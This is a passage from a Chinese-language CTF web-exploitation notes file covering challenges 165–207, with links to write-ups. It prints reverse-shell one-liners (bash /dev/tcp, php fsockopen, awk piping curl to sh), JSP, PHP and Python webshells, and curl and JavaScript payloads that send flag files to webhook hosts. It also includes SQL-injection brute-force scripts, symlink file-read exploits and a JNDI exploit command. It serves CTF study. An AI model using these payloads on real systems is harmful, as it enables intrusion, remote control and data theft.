可用`https://xxx.com/?username=a&password[0]=b`绕过。一般情况直接传数组就行，有的时候需要数组里赋值。也可用`https://xxx.com/username=aaa&password[]=[]`

- php[序列化字符串](https://www.neatstudio.com/show-161-1.shtml)利用引用符号R绕过`secret1 === secret2`。
165. [Christmas Heist](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ChristmasHeist/writeup.md)
- 一个代表windows95的User-agent：`Opera/9.80 (Windows 95) Presto/2.12.388 Version/12.13`
- 一个来自土耳其的ip：`31.143.76.255`
- [hashcat](https://github.com/hashcat/hashcat)爆破jwt密钥:`hashcat -a0 -m 16500 jwt.hash rockyou.txt --show`。其中jwt.hash为要爆破的jwt值。
167. [Restricted Access](https://deyixtan.github.io/posts/wxmctf2023/web2-restricted-access/)
- [http](https://developer.mozilla.org/en-US/docs/Web/HTTP)报文头（header）相关内容。
- User-Agent指定使用的设备
- Referer指定来自何处。题目这里给的提示是maclyonsden.com，实际要加的却是`Referer: https://maclyonsden.com/`。注意多试。
- Date指定访问日期。
- 将Upgrade-Insecure-Requests的值设为1可指定服务器返回加密的安全回复
- 网速/网络相关：Downlink，ECT或RTT
168. [NFTs](https://deyixtan.github.io/posts/wxmctf2023/web3-nfts/)
- python无限制/任意文件上传（[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)）+文件存储路径拼接文件名导致的文件覆盖。
- 此题可以上传任意名字的任意文件，且文件名经过拼接存储。那么就可以上传`../app.py`覆盖原本flask的app.py，使其返回flag。
169. [Brawl: Shopping Spree](https://deyixtan.github.io/posts/wxmctf2023/web4-brawl-shopping-spree/)
- sqlite union联合注入（要注入的表名已知）。
  - > 测试语句：`' UNION SELECT 1,2,3,4,5 FROM skins WHERE '1' = '1`。
  - > 从sqlite_master表中找出指定表的结构：`' UNION SELECT sql,1,1,1,1 FROM sqlite_master WHERE name='secretskins`(表名secretskins需要已知)
  - > 查询出值：`' UNION SELECT skinid,description,image,1,1 as name FROM secretskins WHERE '1' = '1`.
170. [OURspace](https://deyixtan.github.io/posts/wxmctf2023/web5-ourspace/)
- 使用js代码创建form绕过CSP `script-src 'none'`执行xss
```js
const form = document.createElement("form");
const username = document.createElement("input");
const password = document.createElement("input");
username.name = "username";
username.value = "1";
password.name = "password";
password.value = "1";
form.method = "POST"
form.action = "http://127.0.0.1:3000/login";
form.appendChild(username);
form.appendChild(password);
document.getElementsByTagName("body")[0].appendChild(form);
form.submit();
//或者
javascript:{
var form = document.createElement("form");
form.method = "POST";
form.action = "http://127.0.0.1:3000/login";
var element1 = document.createElement("input"); 
var element2 = document.createElement("input");  
element1.value="123456";
element1.name="username";
form.appendChild(element1);  
element2.value="123456";
element2.name="password";
form.appendChild(element2);
document.body.appendChild(form);
form.submit();
}
```
-  绕过`<p style="display: none;">`标签，使标签内的内容显现出来。此题由于会在p标签前直接插入用户可控制内容，导致可以构造另一个未闭合的标签p(`<p name="`)来吞掉目标标签p的`display: none;`属性。或是设置style标签：
```html
<style>
p {
display: inline !important; /* https://developer.mozilla.org/en-US/docs/Web/CSS/important */
margin-top: -24rem;
position: absolute;
}
</style>
```

`!important`的优先级比`display: none;`高，高亮标签内的内容。

171. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)。
```
ngrok tcp 7777
//另一个终端窗口监听指定tcp端口
nc -lv 7777
```
172. [[网鼎杯 2020 青龙组]filejava](http://www.xianxianlabs.com/blog/2020/06/02/377.html)
- 路径穿越导致任意文件下载漏洞。因为是java题，所以根据[Java web应用目录结构](https://www.qikegu.com/docs/1424)，下载WEB-INF里面的web.xml，获取所有的类源码文件。
- poi-ooxml-3.10（一个处理word文档，excel文件的组件）的excel-xxe漏洞：[CVE-2014-3529](https://xz.aliyun.com/t/6996)利用。
173. git文件夹泄露后的版本回退。题目提示flag在git的旧版本里，且可获得完整.git目录。首先用[GitHacker](https://github.com/WangYihang/GitHacker)获取.git目录，然后进行[版本回退](https://www.liaoxuefeng.com/wiki/896043488029600/897013573512192)：`git reset --hard HEAD^`。
174. 绕过302重定向（[bypass 302 redirect](https://gostart.biz/en/how-to-bypass-a-302-redirect/)）。其中一个方法是用curl访问目标网址。
175. ip的两种表示[方式](https://blog.csdn.net/xiaolong_4_2/article/details/80857941)。
176. [msfroggenerator2](../../CTF/picoCTF/Web/msfroggenerator2.md)
- [docker-compose.yml](https://docs.docker.com/compose/compose-file/compose-file-v3/)，[nginx配置文件](https://www.cnblogs.com/54chensongxia/p/12938929.html)和[traefik](https://doc.traefik.io/traefik/routing/overview/)了解。
- js里的searchParams.get可以遍历，有可能存在列表参数，也就是多个 value 一个 key 。而Object.fromEntries 会把多个压缩成一个，并且总是取得最后面的那个。即连续给相同参数附不同值时，只会取到最后面的那个。
- nginx里的&是保留词，如果放在开头就会被nginx 当作另一个参数对待，不会读取。且无法用其url编码形式绕过，因为此题使用ngx.var.arg_xx读取请求的参数，而ngx.var.arg_xx在获取的时候不会进行 urldecode。
- Traefik 2.7.2+会自动将url里的`;`替换为`&`，可能有query参数覆盖。
- chrome puppteer不仅可以访问普通的url，还可以访问`javascript:代码`,`file:///`等协议。并且还可以使用正常浏览器的保存文件等功能。
- chrome对于file scheme有严格的保护机制。对于 fetch 等直接获取信息的东西，无法跨域。并且 file 处于特殊的地方，它和 data 一样都是以 null 作为 origin 并且不能互相访问。如果外部访问 file 的内容会被 chrome 阻止。也就是说，不能用任何 file 之外的东西直接获取 file 的内容，连 open 和 iframe 都不能访问到 file。但file 访问 file 的时候是不受这个限制的。需要注意的是从 file 访问 file 的时候，不能用跨域直接获取信息的方法，例如 fetch 和 open 的返回对象。但是 open 和 iframe 是可以正常用的。
- chrome似乎允许puppeteer的`page.goto`(等于用户在浏览器输入url)执行xss，不管csp。
177. [web签到](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#BEM2dgiACoGmg4x4jKXcJ6kGnQf)
- php中的数组可以直接赋值：
```php
$a[1][2][3][4]='b';
echo $a[1][2][3][4];
//输出b
```
- 如cookie名/内容带中文，需要转换编码再发送。
```python
cookie={"测试:".encode('utf-8').decode("latin-1"):'a'}
```
178. 下面的代码可以用+连接绕过。

```php
<?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die());
              echo $flag;
     } 
} 

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);
}
//payload:?num=114514%2b1805296
```
179. 假设只能使用长度为3个字符以内的命令，但参数不限制，就可以用[awk](https://wangchujiang.com/linux-command/c/awk.html)命令反弹shell。`awk '{system("curl https://your-shell.com/ip:port|sh")}'`
180. php也有整型溢出。例题:[茶歇区](https://blog.csdn.net/miuzzx/article/details/127830557#t16)
181. AES的ECB模式下，一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序。甚至说，可以自己移除某一段密文，只要解密后的明文有效就行。例题:[龙珠NFT](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh)
182. php环境下的反弹shell（reverse shell）命令。`php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'`.
183. [被遗忘的反序列化](https://blog.csdn.net/qq_63928796/article/details/129968742#t1)
- php反序列化漏洞。
- `$_SERVER["HTTP_AAAAAA"]`表示请求header中`aaaaaa`字段的值。
- [php原生类利用](https://www.anquanke.com/post/id/264823)：GlobIterator通过模式匹配遍历文件目录；SplFileObject读取指定文件内容。注意SplFileObject读取文件时是一行一行读的，所以直接`echo new SplFileObject(path)`只会出第一行的内容。似乎用伪协议就没有这个问题。
184. python一句话木马：`__import__("os").popen("ls").read()`。
185. [easy_php](https://blog.csdn.net/m0_64815693/article/details/130038356)
- 使用C（custom object，类名类型）+ArrayObject（Serializable接口）绕过格式化字符串`/^[Oa]:[\d]+/i`过滤。注意此法无法绕过__wakeup。
- 单纯C可以绕过__wakeup。O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。但这种方法不能有属性，那么只能触发__construct和__destruct。
- 不过有C在的情况，会先检测这里类是否实现了Serializable接口。如果有的话，会将里面的值传入重写的unserialize方法。这是可以正常解析的，所以可以通过利用实现了Serializable接口的原生类，来解析正常解析里面的那一串。ArrayObject正是其中之一。
186. linux终端bash反弹shell命令。`bash -c "bash -l > /dev/tcp/IP/PORT 0<&1 2>&1"`
187. linux系统下的flag可能藏在环境变量中。可用`env`或`printenv`命令查看环境变量。
188. [babycat](https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat)
- java网站任意文件读取（读取WEB-INF/web.xml获取网站结构并读取源码）
- jsp一句话木马。
```jsp
<% if("a".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
```

请求：`http://x.x.x.x/cmd.jsp?pwd=b&i=ls`
- json解析特性：JSON 中的内联注释不会影响其解析。如`{"username":"LemonPrefect","password":"pass","role":"superUserLemonPrefect","role"/**/:"admin"}`或`{"username":"LemonPrefect","password":"pass","role":"admin"/*,"role":"guest"*/}`。前者`"role"/**/:"admin"`会正常解析，后者`/*,"role":"guest"*/`不会解析（解析出来role是admin）
189. [[JMCTF 2021]UploadHub](https://blog.csdn.net/weixin_45669205/article/details/117047432)
- php任意文件上传：上传.htaccess改变网站配置。
- apache2.conf配置文件中：

```conf
<Directory ~ "/var/www/html/upload/[a-f0-9]{32}/">
        php_flag engine off
</Directory>
```

`php_flag engine off`设置会让整个目录不解析php，导致上传的php木马无效。
- .htaccess修改网站配置使其解析php。
```
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST['a']);?>
```

其中：
```
ForceType application/x-httpd-php
SetHandler application/x-httpd-php
```
强制所有匹配的文件被一个指定的处理器处理,这里为php。
```
Require all granted  #允许所有请求
php_flag engine on   #开启PHP的解析
php_value auto_prepend_file .htaccess 在主文件解析之前自动解析包含.htaccess的内容
```
- .htaccess文件的盲注。
```
<If "file('/flag')=~ '/flag{/'">
ErrorDocument 404 "wupco"
</If>
```
`~`用于开启“正则表达式”分析，正则表达式必须在双引号之间。如果匹配到flag就设置ErrorDocument 404为"wupco"。可以将中间的`flag{`一个字符一个字符地试错匹配，通过回显判断是否正确，即盲注。

190. md5截断多线程爆破脚本。

```python
#substr(md5(captcha), -6, 6) == "5e1df8"
import hashlib
from multiprocessing.dummy import Pool as ThreadPool 
def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()
keymd5 = '5e1df8'  # 已知的md5截断值
md5start = -6  # 设置题目已知的截断位置
def findmd5(sss):  # 输入范围 里面会进行md5测试
    key = sss.split(':')
    start = int(key[0])  # 开始位置
    end = int(key[1])  # 结束位置
    result = 0
    for i in range(start, end):
        if md5(i)[md5start:] == keymd5:
            result = i
            print(result)  # 打印
            break
list = []  # 参数列表
for i in range(1):  # 多线程的数字列表 开始与结尾.range里的数字表示爆破范围的线程数量
    list.append(str(10000000 * i) + ':' + str(10000000 * (i + 1)))
pool = ThreadPool()  # 多线程任务
pool.map(findmd5, list)  # 函数 与参数列表
pool.close()
pool.join()
```
192. [[BSidesCF 2019]Mixer](https://blog.csdn.net/weixin_44037296/article/details/112370510)
- AES ECB加密内容识别：修改密文的开头几个字节不影响末尾密文的解密（反之也成立，修改密文末尾的字节不影响开头明文的解密）。与CBC模式不同，CBC中修改前段密文解密出来的明文全部都会是乱码。
- ECB加密是16位一组，每组相互独立，加密后每组为32位。
- 在json中1.00 == 1（小数点后几个0都没问题）。
193. [[红明谷CTF 2021]JavaWeb](https://blog.csdn.net/Mrs_H/article/details/124035038)
- Apache [shiro](https://zhuanlan.zhihu.com/p/54176956)框架[判断](https://blog.csdn.net/qq_38154820/article/details/106726691)：可在 cookie 追加一个`rememberMe=xx`的字段，这个字段是rememberMeManager默认的。然后看响应头部可以看看是否有`Set-Cookie:rememberMe=deleteMe; `的字段。若有则是shiro框架。
- CVE-2020-11989,[Apache Shiro权限绕过](https://www.anquanke.com/post/id/222489)：当遇到无法访问的url（直接访问会重定向），可以考虑（假设要访问的url为/json）：
    - /;/json
    - url二次编码
- [jackson反序列化漏洞](https://b1ue.cn/archives/189.html)利用[工具](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)命令:`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl [VPS_IP:PORT] -File=@/flag' -A "[VPS_IP]"`。命令成功执行后复制工具给出的符合要求的rmi地址，使用CVE-2019-14439(springboot)的链子：`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation": "rmi://地址"}]`。需要公网ip。
194. [[FBCTF2019]Products Manager](https://www.cnblogs.com/wkzb/p/12286303.html)
- mysql中的字符串比较。数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，假设String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。如下两条查询语句：`select * from users where username='Dumb'`和`select * from users where username='Dumb '`。它们的查询结果是一致的，即第二条查询语句中Dumb后面的空格并没有对查询有任何影响。因为在MySQL把查询语句里的username和数据库里的username值进行比较时，它们就是一个字符串的比较操作，符合上述特征。
- insert截断。当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。
- 利用上述两个特点，当我们想获取Dumb身份却又不知道其密码时，可以注册一个名为`Dumb         xx`的用户。添加的空格数取决于数据库需要多少字符才会截断，末尾添上任意字符，防止出现用户名已存在。在后面登录时，假设登录代码如下：

```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
WHERE username='$username'
AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
    if(mysql_num_rows($res) > 0){
        return $username;
    }
}
return Null;
?>
```

填入我们注册的`Dumb         xx`和密码是可以查出结果的。虽然用户信息是我们自己的，但查出的用户名是Dumb。如果后续使用用户名而不是用户信息进行逻辑处理，我们就完成了一次越权。

195. [[HCTF 2018]Hideandseek](https://www.cnblogs.com/Yhck/p/13644349.html)
- 软链接zip上传导致的任意文件读取。常出现于以下场景：网站允许上传zip并返回zip压缩的文件的内容。这时就能压缩一个想读取文件路径的软链接，返回的内容就会是想要读取的文件的内容了。
```python
import os
import requests
import sys


def make_zip():
    os.system('ln -s ' + sys.argv[2] + ' test_exp')
    os.system('zip -y test_exp.zip test_exp')


def run():
    make_zip()
    res = requests.post(sys.argv[1], files={'the_file': open('./test_exp.zip', 'rb')})
    print(res.text)

    os.system('rm -rf test_exp')
    os.system('rm -rf test_exp.zip')
run()
```
用法：`python3 s.py http://example/upload /proc/self/environ`。需要在linux环境下运行。
- python的uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址。可使用脚本将16进制的mac地址转换为整数：

```python
mac = "76:22:18:a1:3d:35".split(":")
mac_int = [int(i, 16) for i in mac]
mac_bin = [bin(i).replace('0b', '').zfill(8) for i in mac_int]
mac_dec = int("".join(mac_bin), 2)
print(mac_dec)
```

196. [[WMCTF2020]Web Check in 2.0](https://npfs06.top/2021/02/01/%E5%AF%92%E5%81%87buu30%E8%A7%A3%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/)
- php绕过exit：
```php
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

[file_put_contents](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)支持多个过滤器混用。这里把常用的用于绕过exit的过滤器过滤掉后，还有两种办法。第一种：因为file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以可以利用二次编码绕过。
```
?content=php://filter/write=string.%2572ot13|<?cuc @riny($_TRG[_]);?>/resource=npfs.php 
?content=npfs.php&_=system("ls /");
```

这道题因为会不断执行file_put_contents，所以每个shell只能利用一次，执行一条命令后需要重新上传。第二种：利⽤ zlib 的 zlib.deflate 和 zlib.inflate 来做，中间插⼊string.tolower，把空格和exit处理掉。而插入'%0d'是因为php标签是独立的,需要与php代码分割开。正好%0d是`\r`的url编码，可以用来分割。
```
?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0Deval($_POST[pass]);?%3E/resource=shell.php
(post ?content=shell.php)pass=system("ls /");
```
197. [Connect](https://github.com/tamuctf/tamuctf-2023/tree/master/web/connect)
- curl命令注入带出flag的几种方法
```python
command = "curl -s -D - -o /dev/null " + url
print(os.popen(command).read().strip())
```
    - 直接闭合使用shell命令cat出flag：`;cat flag.txt`
    - 闭合后再次使用curl将flag带出到webhook的url上：`; curl -s webhook/$(cat /flag.txt)`
        - 不使用分号闭合：`http://example.com+file:///flag.txt%0a`
        - 使用curl的参数1:`--upload-file /flag.txt {remote_server}`;2:`http://[link-webhook]/?c= -d @/flag.txt`;3:`-d @flag.txt webhook`或`-X POST -d @/flag.txt webhook`
198. [Migraine](https://github.com/tamuctf/tamuctf-2023/tree/master/web/migraine)
- js任意命令执行，但不能包含字母和数字且无回显。无字母数字这点可以用jsfuck绕过，无回显说明要把flag带到webhook上。但jsfuck中不能使用require,因为require只能在module中使用。只能用全局object process（process.mainModule.require）来访问系统api。
```js
var url = "webhook";
var n = 100;
var buffer = Buffer.allocUnsafe(n);
var fs = process.binding('fs');
var path = "flag.txt";
var fd = fs.open(path, 2, 3, 4, 5);
fs.read(fd, buffer, 0, n, 0, 0, 0);
var flag = buffer.toString();
fetch(url + "?flag=" + flag);
```
```js
process.mainModule.require('https').request({
    hostname: 'webhook.site',
    path: '/149f5661-002a-4618-8760-b7f1b8a0a7c4',
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': process.mainModule.require('fs').readFileSync('/flag.txt').toString().length
    }
}).write(process.mainModule.require('fs').readFileSync('/flag.txt').toString())
```
```js
fetch(["https"].concat(atob("Og==")).concat("//enmxw9zlg1zp.x.pipedream.net/data=").concat(process[Object.keys(process)[74]].require(["child"].concat(Object.keys(process)[71][0]).concat("process").join("")).execSync("cat /flag.txt").toString()).join(""))
```
```js
const js = `
import * as fs from 'node:fs';
fs.readFile('/flag.txt', 'utf8', (err, data) => {
  if (err) {
    fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + "failed");
    return;
  }
  fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + data);
});
`;
// This is a trick to get access to import https://2ality.com/2019/10/eval-via-import.html
const encodedJs = encodeURIComponent(js);
const dataUri = 'data:text/javascript;charset=utf-8,' + encodedJs;
import(dataUri);
```
```js
process.mainModule.require("express").response.send=function(){this.end(process.mainModule.constructor._load("fs").readFileSync("/flag.txt","utf-8"))}
```
- 另一种无字母数字的js写法：https://github.com/mrpapercut/nonalpha-js-obfuscator
199. php文件包含rce。
```php
<?php
include $_REQUEST['file'];
```
当可以完全控制require/include的文件名时，就能使用[PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py —-chain '<?php system("cat /flag.txt");?>'`。参考[Ghazy Corp](https://hackmd.io/@abdinata/Website-Challenge-0xL4ughCTF-2024),控制file_get_contents的文件名也行。另一篇写的非常详细的[wp](https://siunam321.github.io/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/)。不过这篇wp对file_get_contents的利用比较复杂，不是直接读取文件，而是一点一点像blind oracle一样泄露出来文件内容。或者使用pearcmd.php上传木马getshell：
```sh
curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
```
200. [Logical](https://github.com/tamuctf/tamuctf-2023/tree/master/web/logical)
- sqlite布尔盲注（注意与sql区分，两者很像但脚本不能套用）。
  - 使用LIKE语句。注意`_`符号在sqlite like中匹配任意一个字符，所以要放在字符集最后或是转义。https://stackoverflow.com/questions/7323162/sqlite-like-and
```python
import requests
import string
target = ''
alphabet = string.ascii_letters + string.digits + '{$}#!?<>=*+.(),@^-_'
flag = list('flag{')
while flag[-1] != '}':
    for char in alphabet:
        r = requests.post(target, data={'username': f'admin\' and PASSWORD LIKE BINARY "{"".join(flag)}{char}%"-- '}) 
        if 'not exists' not in r.text:
            flag.append(char)
            print(''.join(flag))
            break
```
- 判断注入目标使用了哪些字符。[escape](https://blog.csdn.net/ameyume/article/details/8007149) 表示转义，直接用反斜杠也行。
```python
def enumerate_characters(charset=printable):
    used_charset = ""
    for char in charset:
        payload = f"admin' and password like '%|{char}%' escape '|"
        response = requests.post(URL, data={"username" : payload})
        
        if response.status_code == 200 and response.json()['res'] == 'exists':
            used_charset += char
       
    return used_charset
```
  - 多线程([concurrent.futures](https://python-parallel-programmning-cookbook.readthedocs.io/zh_CN/latest/chapter4/02_Using_the_concurrent.futures_Python_modules.html))LIKE并转义特殊符号
```python
import string
import urllib.parse
import concurrent.futures
import requests

session = requests.Session()
FLAG = "flag{"

def validate_current_password(char):
    # escape characters used by SQL's LIKE operator
    if char == "%":
        char = "\%"
    elif char == "_":
        char = "\_"
    
    # setting up request
    url = f""
    headers = { "Content-Type": "application/x-www-form-urlencoded" }
    user_input = "admin' AND password LIKE '" + FLAG + char + "%';"
    data = f"username={urllib.parse.quote(user_input)}"
    response = session.post(url, headers=headers, data=data)
    
    # not exists
    if response.status_code != 200:
        return None
    
    content = response.json()["res"]
    if content != "exists":
        return None
    
    # exists
    return char


added = True # check to stop loop when looped all ASCII characters and did not append to flag
# brute force
while not FLAG.endswith("}") and added == True:
    added = False
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(validate_current_password, c) for c in string.printable]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == None:
                continue
            FLAG += result
            added = True
            print(FLAG)
            executor.shutdown(wait=True, cancel_futures=True)
            break
        
    if added == False:
        break

print(f"Final flag: {FLAG}")
print("Done")
```
  - 使用SUBSTRING+ascii+二分法
```python
import requests
import string

host="" #challange server

false_data = {
        "username":"payload"
}
res = requests.post(host,data=false_data)
false_data = res.json()['res']

burteforce_string = string.printable

def sqli(pos,char):
    data = {
        "username":"admin' and ascii(SUBSTRING((SELECT password FROM users WHERE Username = 'admin'), %d, 1)) > %d#"%(pos,char)
    }
    r = requests.post(host,data=data)
    print(data, r.text)
    result = r.json()['res']

    
    return  result != false_data

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi: #calculating the first mid
        mid = lo + (hi - lo) 
        if sqli(pos, mid): 
            lo = mid + 1
        else:
            hi = mid - 1
    print(lo)
    return chr(lo)

blacklist_char = "'\""
flag = ''
for pos in range(10, 64):
    flag += get_char(pos)
    print("flag",flag)
```

201. [Flag Fetcher](https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher)
- rust [actix-web](https://web.veaba.me/rust/actix-web/)入门。
```rs
#[get("/flag")]
async fn get_flag(){}
```

可以创建一个名为/flag的路由，内部逻辑在get_flag函数中定义。但光定义路由是不够的，还需要将该路由加到App中。如果不加会导致404。
```rs
HttpServer::new(move || {
    App::new()
        .service(get_flag)
})
```
- PathBuf extend函数的错误使用。
```rs
#[get("/static/{filename:.*}")]
async fn static_files(req: HttpRequest) -> Result<fs::NamedFile, Error> {
    let requested: PathBuf = req.match_info().query("filename").parse()?;
    let requested: PathBuf = requested
        .components()
        .filter(|&entry| entry != Component::ParentDir)
        .collect();

    let mut path = PathBuf::from_str("static").unwrap();
    path.extend(&requested);

    let file = fs::NamedFile::open(path)?;
    Ok(file.use_last_modified(true))
}
```
代码使用[PathBuf](https://rustwiki.org/zh-CN/std/path/struct.PathBuf.html )过滤掉`../`，但后续又用extend拼接上用户可控制的filename。extend的[内部](https://doc.rust-lang.org/1.69.0/src/std/path.rs.html#1755-1757)调用了push，而push在遇到绝对路径参数时会替代已有的path，导致路径穿越。因此只需访问`http://example.com/static//key`即可访问根目录下的key文件。

202. [Web LTO](https://astr.cc/blog/tamuctf-2023-writeup/#web-lto)
- 重用文件描述符（reuse file handles/descriptors)的风险。此题实现了下面的逻辑：
    - 用户上传文件，服务器在tmp下打开一个文件
    - seek到temp文件的开头，将内容用tar打包后返回，删除原本文件
漏洞点在于服务器在打开文件时没有考虑重名的问题。假设我们发送了一个持续十秒的post请求，此时有机器人上传flag.txt文件。服务器先打开了代表我们的文件的r+w文件句柄，同时因为文件重名导致服务器重用该文件句柄导致机器人上传的flag覆盖了空白文件。就算后续机器人删除了文件，但我们仍持有r+w的文件句柄，还是可以读文件。
- python实现慢速post。
```python
import requests, time

def generator():
    print("sending multipart header...")
    yield b"--boundary\r\nContent-Disposition: form-data; name=\"a\"; filename=\"flag.txt\"\r\n\r\n"

    print("sleeping...")
    time.sleep(15)

    print("finishing request...")
    yield b"\r\n--boundary--\r\n"

r = requests.post("http://example.com", headers={
    "Content-Type": "multipart/form-data; boundary=boundary"
}, data=generator(), cookies={"whoami": "nobody"})
print(r.text)
```
203. http [range](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests)字段头.可用于指定下载较大request的哪一部分。https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/64bps
204. [Extract Service 2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/extract2)
- 软链接（symlink）也可用于docx文件内部。docx文件内部有个word/document.xml，里面记录着word文档的文字。那么将这个文件替换为软链接，就能在服务器提取文字时读取任意文件。
```sh
mkdir word
cd word
ln -s /flag document.xml
cd ../
7z a exploit.zip word
```
205. [certified1](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified1)
- rust ImageMagick web应用漏洞：[CVE-2022-44268](https://www.metabaseq.com/imagemagick-zero-days/).当处理png时，可能会导致服务器上的任意文件读取。[poc](https://github.com/voidz0r/CVE-2022-44268)
  - 注意这个漏洞无法读取/proc下的文件，因为/proc下的文件不是真正意义上的文件：https://superuser.com/questions/619955/how-does-proc-work 。所以需要配合题目中自带的其他漏洞：[certified2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)
- 不是rust web应用也可以用，参考 https://pegimon.medium.com/tuctf-web-png-and-jelly-sandwich-28b2f0736467 。更多漏洞： https://www.metabaseq.com/imagemagick-zero-days/ ，工具 https://github.com/Sybil-Scan/imagemagick-lfi-poc
206. [Lambda](https://hackmd.io/@Solderet/SomeWriteupForWaniCTF2023-XogSiA#Lambda---web)
- AWS相关考点cheatsheet：https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md
- 此题给出了AWS相关凭证，要求获取其lambda函数(A lambda function is a piece of code that is executed whenever is triggered by an event from an event source)内容。以下代码获取lambda函数名称：
```python
import boto3
from pprint import pprint

access_key_id = 
secret_access_key = #key_id和access_key属于凭证内容
region = #region可以在url里找到。题目发送登陆验证请求时抓包，会看见类似这样的url： https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test 。这个url中ap-northeast-1就是region，k0gh2dp2jg则是API的ID

client = boto3.client(
    "apigateway",
    aws_access_key_id=access_key_id,
    aws_secret_access_key=secret_access_key,
    region_name=region
)

restApiId = client.get_rest_apis()['items'][0]['id']
print("Rest API ID:", restApiId)
resourceId = client.get_resources(restApiId=restApiId)['items'][0]['id']
print("Resource ID:", resourceId)
response = client.get_method(
    restApiId=restApiId,
    resourceId=resourceId,
    httpMethod="GET"
)
pprint(response)
```

获取函数名后就能得到其内容了。
```python
client = boto3.client("lambda",
                      aws_access_key_id=access_key_id,
                      aws_secret_access_key=secret_access_key,
                      region_name=region)

response = client.get_function(FunctionName="wani_function")

pprint(response)
```
官方[wp](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/lambda)给的是命令行的解法
- 另一道类似的题：[Mary had a little lambda](https://lrc-1.gitbook.io/lrc-docs/mary-had-a-little-lambda)

207. [screenshot](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/screenshot)
- SSRF常出现于服务器访问用户提供的url时。此时可用file://协议读取本地文件。
- js里的req.query.url在名为url的参数有两个时，会返回列表。此处隐藏着parameter type confusion。下面的代码：
```js
if (!req.query.url.includes("http") || req.query.url.includes("file")) {
  res.status(400).send("Bad Request");
  return; 
}
```

要求url参数里包含http且不包含file。可以用`?url=file%3A%2F%2F%2Fflag.txt&url=http`绕过。
- `URLSearchParams.prototype.get()`特性：当多个相同参数被传入url时，会返回第一个。也就是说：
```js
//?url=file%3A%2F%2F%2Fflag.txt&url=http
const params = new URLSearchParams(req.url.slice(req.url.indexOf("?")));
await page.goto(params.get("url"));
//会返回file:///flag.txt
```
- file协议不是大小写敏感的。上面的过滤也可以用`filE:///http/../flag.txt`绕过。
